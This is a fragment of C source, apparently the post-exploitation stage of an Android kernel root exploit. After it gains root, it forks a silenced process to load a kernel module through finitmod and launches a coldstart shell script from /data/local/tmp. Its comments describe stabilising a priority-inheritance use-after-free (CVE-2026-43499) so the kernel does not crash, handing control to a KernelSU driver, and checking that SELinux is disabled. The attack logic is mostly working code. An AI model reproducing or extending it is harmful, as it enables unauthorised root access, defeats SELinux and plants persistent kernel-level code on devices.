      pid_t fm = fork();
      if (fm == 0) {
        prctl(PR_SET_PDEATHSIG, SIGKILL);
        signal(SIGHUP, SIG_IGN);
        signal(SIGPIPE, SIG_IGN);
        prctl(PR_SET_NAME, "ks_finitmod");
        setsid();
        int nfd = open("/dev/null", O_RDWR);
        if (nfd >= 0) {
          dup2(nfd, STDIN_FILENO);
          dup2(nfd, STDOUT_FILENO);
          dup2(nfd, STDERR_FILENO);
          if (nfd > STDERR_FILENO) close(nfd);
        }
        execl(finitmod, "finitmod", ko, "0", (char *)NULL);
        _exit(127);
      } else if (fm > 0) {
        int st = -1, w = -1;
        for (int i = 0; i < 50; i++) {
          w = waitpid(fm, &st, WNOHANG);
          if (w == fm) break;
          usleep(100000);
        }
        if (w != fm) {
          pr_warning("root self finitmod child=%d still running after 5s\n", (int)fm);
        } else {
          fm_ok = WIFEXITED(st) && WEXITSTATUS(st) == 0;
          pr_info("root self finitmod child=%d status=%d ok=%d\n", (int)fm, st, fm_ok);
        }
      } else {
        pr_warning("root self finitmod fork failed errno=%d\n", errno);
      }
    } else {
      pr_info("root self finitmod skip access finitmod=%d ko=%d\n",
              access(finitmod, X_OK), access(ko, R_OK));
    }

    if (fm_ok) {
      const char *coldstart = getenv("KS_COLDSTART");
      if (!coldstart || !coldstart[0]) coldstart = "/data/local/tmp/home/coldstart.sh";
      if (access(coldstart, R_OK) == 0) {
        pr_info("root self coldstart fork %s\n", coldstart);
        pid_t cs = fork();
        if (cs == 0) {
          prctl(PR_SET_PDEATHSIG, SIGKILL);
          signal(SIGHUP, SIG_IGN);
          signal(SIGPIPE, SIG_IGN);
          prctl(PR_SET_NAME, "ks_coldstart");
          setsid();
          int nfd = open("/dev/null", O_RDWR);
          if (nfd >= 0) {
            dup2(nfd, STDIN_FILENO);
            int lfd = open("/data/local/tmp/home/coldstart.log",
                           O_WRONLY | O_CREAT | O_APPEND, 0666);
            if (lfd >= 0) {
              dup2(lfd, STDOUT_FILENO);
              dup2(lfd, STDERR_FILENO);
              if (lfd > STDERR_FILENO) close(lfd);
            } else {
              dup2(nfd, STDOUT_FILENO);
              dup2(nfd, STDERR_FILENO);
            }
            if (nfd > STDERR_FILENO) close(nfd);
          }
          execl("/system/bin/sh", "sh", coldstart, (char *)NULL);
          _exit(127);
        } else if (cs > 0) {
          pr_info("root self coldstart child=%d started\n", (int)cs);
        } else {
          pr_warning("root self coldstart fork failed errno=%d\n", errno);
        }
      } else {
        pr_info("root self coldstart skip access=%d path=%s\n",
                access(coldstart, R_OK), coldstart);
      }
    }
  }

  /*
   * CVE-2026-43499 PI cleanup: clear waiter->pi_blocked_on via the pipe
   * primitive while fd is still valid, then signal the waiter thread that
   * it is safe to exit.  Without this, waiter thread exit frees the kernel
   * stack page that the stale PI chain points at -> oops -> panic -> reboot.
   *
   * NOTE: this whole stage runs ON the waiter thread (cfi stage executes
   * inside do_pselect_fake_lock_route), so "waiter exit" == returning from
   * this stack.  Only release if the clear verifiably landed; otherwise fall
   * back to holding forever (waiter's own timeout also holds).
   */
  /*
   * PI was cleared right after the child result (pre-self); the waiter
   * thread can only return from do_pselect_fake_lock_route safely if
   * that landed -- pi_ok=0 already held forever above.
   */
self_patch_skip: /* kill switch above jumps here: neutralized, not flipped */
  fake_gki_release(fd);

  pr_info("root self exiting (PI safe; control -> kernelsu driver) done=%d\n",
          root_child_done);

  return (root_child_done || atomic_load(&self_root_ok)) &&
         (!opt_disabled_selinux || selinux_after == 0);
}
